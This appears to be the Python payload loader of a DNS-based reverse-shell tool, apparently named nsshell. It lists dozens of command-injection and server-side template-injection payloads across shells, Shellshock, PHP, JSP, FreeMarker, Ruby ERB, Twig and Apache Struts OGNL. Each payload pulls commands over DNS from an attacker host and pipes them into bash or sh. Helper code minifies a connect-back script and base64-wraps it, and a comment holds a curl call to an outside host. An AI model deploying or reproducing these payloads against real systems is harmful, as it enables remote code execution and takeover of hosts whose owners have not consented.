#rook
import os
import sys
import netaddr
import string
import base64

from nsshell.config import config

#todo: needs testing
class loader:
    sh_conbacks=""
    payloads = [#todo: Windows, commented out payloads are known to be broken
                # ["|nslookup -type=txt %host%|cmd.exe|"],#windows injections
                # ["'|nslookup -type=txt %host%|cmd.exe|"],
                # ["\"|nslookup -type=txt %host%|cmd.exe|"],
                # ["\\'|nslookup -type=txt %host%|cmd.exe|"],
                # ["\\\"|nslookup -type=txt %host%|cmd.exe|"],
                # ["&nslookup -type=txt %host%>t.bat&cmd.exe /C t.bat&"],# no pipe, but uses disk
                # ["'&nslookup -type=txt %host%>t.bat&cmd.exe /C t.bat&"],
                # ["\"&nslookup -type=txt %host%>t.bat&cmd.exe /C t.bat&"],
                # ["\\'&nslookup -type=txt %host%>t.bat&cmd.exe /C t.bat&"],
                # ["\\\"&nslookup -type=txt %host%>t.bat&cmd.exe /C t.bat&"],
                # ["|dig %host% txt +short|perl"],#https://www.vpnoverdns.com/hack.html
                # ["'|dig %host% txt +short|perl"],#perl
                # ["\"|dig %host% txt +short|perl"],#perl
                # ["`dig %host% txt +short|perl`"],#perl
                # ["$(dig %host% txt +short|perl)"],#perl
                ["|host 1 %ip%|bash",sh_conbacks],
                ["|host 1 %host%|bash",sh_conbacks],
                ["`host 1 %ip%|bash`",sh_conbacks],
                ["$(host 1 %ip%|bash)",sh_conbacks],
                ["`{host,1,%ip%}|bash`",sh_conbacks],
                ["|nslookup 1 %ip%|bash",sh_conbacks],
                ["|nslookup 1 %host%|bash",sh_conbacks],
                ["`nslookup 1 %ip%|bash`",sh_conbacks],
                ["$(nslookup 1 %ip%|bash)",sh_conbacks],
                ["`{nslookup,1,%ip%}|bash`",sh_conbacks],
                #`eval $(nslookup 1 7.hack.com)`
                #`$(nslookup 2 7.hack.com)`
                ["$(eval $(nslookup %host%))",sh_conbacks],
                ["$(eval $(nslookup 1 %ip%))",sh_conbacks],
                ["$({eval,$({nslookup,1,%ip%})})",sh_conbacks],
                ["$({eval,$({nslookup,%host%})})",sh_conbacks],
                ["nslookup -type=txt %host%|bash",sh_conbacks],#basic *nix injection
                ["eval `nslookup -type=txt %host%`",sh_conbacks],#no pipe
                ["eval $(nslookup -type=txt %host%)",sh_conbacks],
                ["\"&eval $(nslookup -type=txt %host%)&",sh_conbacks],
                ["\"&eval \"$(nslookup -type=txt %host%)\"&",sh_conbacks],
                ["'&eval `nslookup -type=txt %host%`&",sh_conbacks],
                ["'&eval '$(nslookup -type=txt %host%)'&",sh_conbacks],
                ["{nslookup,-type=txt,%host%}|bash",sh_conbacks],#simple, no space.
                ["{nslookup,-type=txt,%host%}|bash",sh_conbacks],#simple, no space.
                #sh proper, not bash
                ["nslookup {echo,\' %host%|sh",sh_conbacks],#sh connect back
                ["'|nslookup {echo,\' %host%|sh",sh_conbacks],#sh connect back
                ["\"|nslookup {echo,\' %host%|sh",sh_conbacks],#sh connect back
                ["`nslookup {echo,\' %host%|sh`",sh_conbacks],#sh connect back
                ["{nslookup,\{echo\,\',%host%}|sh",sh_conbacks],#sh connect back
                ["'|{nslookup,\{echo\,\',%host%}|sh",sh_conbacks],#sh connect back
                ["\"|{nslookup,\{echo\,\',%host%}|sh",sh_conbacks],#sh connect back
                ["`{nslookup,\{echo\,\',%host%}|sh`",sh_conbacks],#sh connect back
                #'11337'$'\056''gmaml'$'\056''com'# no dots
                #Doesn't work,  semicolons cause syntax error.
                # ["&bash -c `dig %host%`&",sh_conbacks],#dig instead of nslookup -type=txt
                # ["&bash -c $(dig %host%)&",sh_conbacks],#dig instead of nslookup -type=txt
                # ["|dig %host%|bash|",sh_conbacks],#dig instead of nslookup -type=txt
                # ["\"|dig %host%|bash|",sh_conbacks],#dig instead of nslookup -type=txt
                # ["'|dig %host%|bash|",sh_conbacks],#dig instead of nslookup -type=txt
                # ["|dig %host%|bash|",sh_conbacks],#how small can we go?
                # ["'|dig %host%|bash|",sh_conbacks],#Maybe /bin/bash is missing...
                # ["\"|dig %host%|bash|",sh_conbacks],#
                #bash -c doens't work very well
                #["{bash,-c,`{nslookup,-type=txt,%host%}`}",sh_conbacks],#no whitespace,  using "sans spacing"
                #["{bash,-c,$({nslookup,-type=txt,%host%})}",sh_conbacks],
                #["'&{bash,-c,`{nslookup,-type=txt,%host%}`}",sh_conbacks],
                #["\"&{bash,-c,$({nslookup,-type=txt,%host%})}",sh_conbacks],
                #["\\'&{bash,-c,`{nslookup,-type=txt,%host%}`}",sh_conbacks],
                #["\\\"&{bash,-c,$({nslookup,-type=txt,%host%})}",sh_conbacks],
                #["$({bash,-c,$({nslookup,-type=txt,%host%})})",sh_conbacks],
                #["`{bash,-c,\\`{nslookup,-type=txt,%host%}\\`}`",sh_conbacks],
                ["&nslookup -type=txt %host%|bash&",sh_conbacks],#generic escapes
                ["|nslookup -type=txt %host%|bash||1",sh_conbacks],
                [";nslookup -type=txt %host%|bash;",sh_conbacks],
                ["\";nslookup -type=txt %host%|bash;",sh_conbacks],
                ["';nslookup -type=txt %host%|bash;",sh_conbacks],
                ["\"|nslookup -type=txt %host%|bash||1",sh_conbacks],
                ["'|nslookup -type=txt %host%|bash||1",sh_conbacks],
                ["\"&nslookup -type=txt %host%|bash&",sh_conbacks],
                ["'&nslookup -type=txt %host%|bash&",sh_conbacks],
                ["`nslookup -type=txt %host%|bash`",sh_conbacks],#string pre-processor
                ["$(nslookup -type=txt %host%|bash)",sh_conbacks],#string pre-processor
                ["$(nslookup$IFS-type=txt$IFS%host%|bash)",sh_conbacks],#no white space
                ["\"|nslookup$IFS-type=txt$IFS\"%host%|bash||1",sh_conbacks],#no white space using $IFS variable.
                ["'|nslookup$IFS-type=txt$IFS'%host%|bash'||1",sh_conbacks],#no white space
                ["\\\"|nslookup -type=txt %host%|bash||1",sh_conbacks],#doulbe-escape
                ["\\\'|nslookup -type=txt %host%|bash||1",sh_conbacks],#doulbe-escape
                ["\\\"&nslookup -type=txt %host%|bash&",sh_conbacks],#doulbe-escape
                ["%c0\"|nslookup -type=txt %host%|bash||1",sh_conbacks],#gbk multi-byte injection
                ["%ca\"|nslookup -type=txt %host%|bash||1",sh_conbacks],#gbk multi-byte injection
                ["%0a%08\"|nslookup -type=txt %host%|bash||1",sh_conbacks],#newline regex terminiation bypass.
                ["%c0'|nslookup -type=txt %host%|bash||1",sh_conbacks],#gbk multi-byte injection
                ["%ca'|nslookup -type=txt %host%|bash||1",sh_conbacks],#gbk multi-byte injection
                ["%0a%08'|nslookup -type=txt %host%|bash||1",sh_conbacks],#newline regex terminiation bypass.
                ["(){_;}>_[$($())],{nslookup -type=txt %host%|bash;}",sh_conbacks],#bashellbashock #2
                ["(){:;};nslookup -type=txt %host%|bash;",sh_conbacks],#bashellbashock
                ["system('nslookup -type=txt %host%|bash')",sh_conbacks],#GNU Octave/generic.
                ["'+system('nslookup -type=txt %host%|bash')+'",sh_conbacks],#GNU Octave/generic.
                ['"+system("nslookup -type=txt %host%|bash")+"',sh_conbacks],#GNU Octave/generic.
                ["\\'+system('nslookup -type=txt %host%|bash')+\\'",sh_conbacks],#GNU Octave/generic.
                ['\\"+system("nslookup -type=txt %host%|bash")+\\"',sh_conbacks],#GNU Octave/genric.
                ['<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("nslookup -type=txt %host%|bash") }'], #Java FreeMarker server-side template injection
                ["{{python}}`nslookup -type=txt %host%|bash`{{/python}}",sh_conbacks],#python velocity
                ["'-require('child_process').exec('{nslookup,-type=txt,%host%}|bash')-'"],#dust.js server-side template for node.js (untested)
                ["\"-require(\"child_process\").exec(\"{nslookup,-type=txt,%host%}|bash\")-\""],#dust.js server-side template for node.js(untested)
                ["<%`nslookup -type=txt %host%|bash`%>",sh_conbacks],#Ruby ERB server-side template injection
                ["<?php`nslookup -type=txt %host%|bash`?>",sh_conbacks],#PHP generic
                ["{{`nslookup -type=txt %host%|bash`}}",sh_conbacks],#PHP Twig/Misc. server-side template injection
                ['<cfexecute name="/bin/bash" arguments="-c \'nslookup -type=txt %host%|bash\'" timeout="1" />'],#cold fusion - untested.
                #["<%@page import="java.lang.*"%><%Runtime.getRuntime().exec(\"cmd /c nslookup -type=txt %host%|cmd\");%>",sh_conbacks],#JSP template injection windows
                ['<%@ page import="java.util.*,java.io.*"%><%Runtime.getRuntime().exec(new String[]{"bash","-c","nslookup -type=txt %host%|bash"});%>',sh_conbacks],#JSP template Injection *nix
                # java struts code exec vuln, these are url params like http://f.com/a/?redirect:blahblahblah see https://struts.apache.org/docs/s2-016.html
                # this one is for debugging, had some issues with url encoding, this payload will output the results in HTTP response ['''redirect:%25{%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash','-c','nslookup+-type%3dtxt+%host%|bash'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}})).start()}''', sh_conbacks],
                ['''redirect:%25{%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash','-c','nslookup+-type%3dtxt+%host%|bash'})).start()}''', sh_conbacks],
                ['''redirectAction:%25{%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash','-c','nslookup+-type%3dtxt+%host%|bash'})).start()}''', sh_conbacks],
                ['''action:%25{%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash','-c','nslookup+-type%3dtxt+%host%|bash'})).start()}''', sh_conbacks],
                ]#TODO: add more
#set($x = "bash_-c_nslookup -type=txt 14.9.hack.com|bash")

 #      $class.inspect("java.lang.Runtime").type.getRuntime().exec($x.split("_")).waitFor()
    #$date.getClass().getClass().forName('java.lang.Runtime').getRuntime().exec('curl http://j.hack.com:8000/vuln')
    def __init__(self, hostname, ip):
        self.ip=ip
        if hostname == "localhost":
        #can't be authoratative for localhost
            #the space tells nslookup to use localhost as as resulver
            hostname = " localhost"
        self.hostname = hostname

    def get_payload(self, dex):
        ret = False
        if dex and dex.isdigit():
            dex = int(dex)
            if dex in self.payloads:
                ret = self.payloads[dex][0]
                ret = ret.replace("%host%", self.hostname)
                ret = ret.replace("%ip%", str(int(netaddr.IPAddress(self.ip))))
        return ret

    def build_payloads(self):
        x=0
        ret = []
        for p in self.payloads:
            p = p[0].replace("%host%",str(x)+"."+self.hostname)
            p = p.replace("%ip%", str(int(netaddr.IPAddress(self.ip))))
            ret.append(p)
            x+=1
        return ret

    #smaller bash! - similar output to http://bash-minifier.appspot.com/
    # minify.py seems to be less reliable
    def ghetto_minifier(self, script):
        script=script.replace("\t"," ")
        script=script.replace("\n"," ")
        new_len=0
        old_len=len(script)
        while new_len != old_len:
            old_len=len(script)
            script=script.replace("  "," ")
            new_len=len(script)
        script=script.replace(" if ",";if ")
        script=script.replace("fi ","fi;")
        script=script.replace(" fi",";fi")
        script=script.replace(" while",";while")
        script=script.replace("while : ","while :;")
        script=script.replace(" do",";do")
        script=script.replace(";do;",";do ")
        script=script.replace(" done",";done")
        script=script.replace("done ","done;")
        script=script.replace(";;",";")
        script=script.replace("; ",";")
        return script

    # we have to use the bash runner for now.
    def get_connect(self, sess_id, direct=False, shell="bash"):
        hostname = self.hostname
        if hostname == "localhost" or direct:
            #can't be authoratative for localhost
            #Direct connections tell ns lookup to come directly to nsshell
            hostname=" "+hostname
        chunk_loader = ''
        with open(os.path.join(config.SCRIPTS_DIR,
                               'connect.{0}'.format(shell))) as f:
            chunk_loader = f.read()
        chunk_loader=self.ghetto_minifier(chunk_loader)
        #add vars
        chunk_loader=chunk_loader.replace("%q%", sess_id)
        chunk_loader=chunk_loader.replace("%hostname%", hostname)
        #wrap for execution
        new_connect = base64.b64encode(chunk_loader)
        new_connect = "`{echo,"+new_connect+"}|{base64,--decode}|"+shell+"`"
        return new_connect

    # we have to use the bash runner for now.
    def get_runner(self, sess_id, cmd, direct=False, shell = "bash"):
        hostname = self.hostname
        if hostname == "localhost" or direct:
            #Direct connections tell ns lookup to come directly to nsshell
            hostname=" "+hostname
        chunk_loader = ''
        with open(os.path.join(config.SCRIPTS_DIR,
                               'runner.{0}'.format(shell))) as f:
            chunk_loader = f.read()
        chunk_loader=self.ghetto_minifier(chunk_loader)
        #add vars
        chunk_loader=chunk_loader.replace("%q%", sess_id)
        chunk_loader=chunk_loader.replace("%whoami%", cmd)
        chunk_loader=chunk_loader.replace("%hostname%", hostname)
        return chunk_loader

#useful for testing
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print "./loader.py hostname ip"
        print "./loader.py hostname ip sess_id"
    elif len(sys.argv) < 4:
        load = loader(sys.argv[1])
        for p in load.build_payloads():
            print p
    else:
        load = loader(sys.argv[1])
        #print load.get_connect(sys.argv[2])
        print load.get_runner(sys.argv[2])
